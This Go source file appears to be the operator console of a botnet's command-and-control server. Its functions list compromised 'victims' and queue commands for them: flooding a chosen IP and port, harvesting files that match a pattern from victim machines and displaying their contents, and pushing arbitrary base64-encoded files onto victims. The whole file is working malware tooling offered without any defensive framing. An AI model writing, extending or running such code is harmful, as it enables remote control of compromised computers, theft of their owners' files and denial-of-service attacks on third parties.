package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	
	"time"
)


// edit later
var options = []option{
	{"/help", 0, specificHelp},
	{"/clear", 0, CallClear},
	{"/exit", 0, exitFunction},
	{"/list", 0, listVictims},
	{"/floodping", -1, floodping},
	{"/supercat", -1, supercat},
	{"/writefile", -1, writefile},
	{"/showsupercat", -1, showSuperCat},
}

func listVictims(params ...interface{}) {
	clientTreeMutex.Lock()
	defer clientTreeMutex.Unlock()

	if clientTree.Size() == 0 {
		fmt.Println("No registered victims found.")
		return
	}

	it := clientTree.Iterator()
	for it.Next() {
		hash := it.Key().(string)
		victim := it.Value().(VictimInfo)

		fmt.Printf("- Hash: %s\n", hash)

		if len(victim.Commands) == 0 {
			fmt.Println("  No queued commands.")
		} else {
			for i, cmd := range victim.Commands {
				fmt.Printf("  [%d] CommandType: %s, Args: %v\n",
					i+1, cmd.Commandytype, cmd.Arguments)
			}
		}

		fmt.Println() // spacing between victims
	}
}

func showSuperCat(params ...interface{}) {
	args, ok := params[0].([]string)
	if !ok || len(args) != 1 {
		fmt.Println("Usage: /showsupercat <victimHash>")
		return
	}

	hash := args[0]

	superCatMutex.Lock()
	defer superCatMutex.Unlock()

	val, found := superCatTree.Get(hash)
	if !found {
		fmt.Println("No supercat data found for:", hash)
		return
	}

	entries := val.([]IncomingSuperCatData)
	for _, entry := range entries {
		fmt.Printf("Filename: %s\nContent:\n%s\n\n", entry.Filename, entry.Content)
	}
}

func floodping(params ...interface{}) {
	args, ok := params[0].([]string)
	if !ok || len(args) < 3 {
		fmt.Println("Usage: /floodping <victimHash> <ip> <port>")
		return
	}

	hash := args[0]
	ipport := args[1] + ":" + args[2]

	cmd := VictimCommand{
		Commandytype: "floodping",
		Arguments:    []string{ipport},
	}

	AddCommandToVictim(hash, cmd)

}

func supercat(params ...interface{}) {
	args, ok := params[0].([]string)
	if !ok || len(args) < 2 {
		fmt.Println("Usage: /supercat <victimHash> <filePattern>")
		return
	}

	hash := args[0]
	fileglob := args[1]

	cmd := VictimCommand{
		Commandytype: "supercat",
		Arguments:    []string{fileglob},
	}

	AddCommandToVictim(hash, cmd)

}

func writefile(params ...interface{}) {
	args, ok := params[0].([]string)
	if !ok || len(args) < 2 {
		fmt.Println("Usage: /writefile <victimHash> <file1> [file2] ...")
		return
	}

	hash := args[0]
	files := args[1:]

	for _, filename := range files {
		content, err := os.ReadFile(filename)
		if err != nil {
			fmt.Printf("Can't read %s, error: %v\n", filename, err)
			continue
		}

		cmd := VictimCommand{
			Commandytype: "writefile",
			Arguments: []string{
				filepath.Base(filename),
				base64.StdEncoding.EncodeToString(content),
			},
		}

		AddCommandToVictim(hash, cmd)
	}

}

// exits the program
func exitFunction(params ...interface{}) {
	exitStr := "Goodbye\n"
	for i := 0; i < len(exitStr); i++ {
		fmt.Print(string(exitStr[i]))
		time.Sleep(100 * time.Millisecond)
	}
	os.Exit(0)
	//return 1
}
